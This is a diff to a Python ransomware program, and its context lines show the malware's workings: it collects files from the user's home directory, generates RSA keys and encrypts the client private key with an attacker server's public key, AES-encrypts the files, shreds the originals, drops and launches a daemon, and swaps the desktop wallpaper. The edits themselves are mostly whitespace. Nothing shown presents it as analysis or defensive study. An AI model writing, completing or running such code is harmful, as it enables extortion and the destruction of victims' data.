@@ -21,7 +21,6 @@ from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 
 
-
 def encrypt_priv_key(msg, key):
     line = msg
     n = 127
@@ -34,6 +33,7 @@ def encrypt_priv_key(msg, key):
         ciphertext = cipher.encrypt(i)
         cifrado.append(ciphertext)
     return cifrado
+
 
 def shred(file_name,  passes=1):
 
@@ -86,8 +86,6 @@ def start_encryption(files):
     return AES_and_base64_path
 
 
-
-
 def menu():
 
     # create ransomware directory 
@@ -100,13 +98,10 @@ def menu():
     # /home/$USER
     files = get_files.find_files(variables.home)
 
-
     # create RSA object
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
     
-    server_public_key_object = RSA.importKey(variables.server_public_key)
-
     Client_private_key = rsa_object.private_key_PEM
     Client_public_key = rsa_object.public_key_PEM
     encrypted_client_private_key = encrypt_priv_key(Client_private_key, variables.server_public_key)
@@ -129,7 +124,6 @@ def menu():
     # Get the client public key back as object
     client_public_key_object =  RSA.importKey(Client_public_key)
     client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
-
 
     # FILE ENCRYPTION STARTS HERE !!!
     aes_keys_and_base64_path = start_encryption(files)
@@ -175,7 +169,6 @@ def drop_daemon_and_decryptor():
     os.system('./daemon')
 
 
-
 def change_wallpaper():
     with open(variables.ransomware_path + "/img.png", 'wb') as f:
         f.write(base64.b64decode(variables.img))
@@ -200,6 +193,7 @@ for (i=0;i<Desktops.length;i++) {
     os.system(xfce)
     os.system(xfce1)
     os.system(kde)
+
 
 if __name__ == "__main__":
     menu()
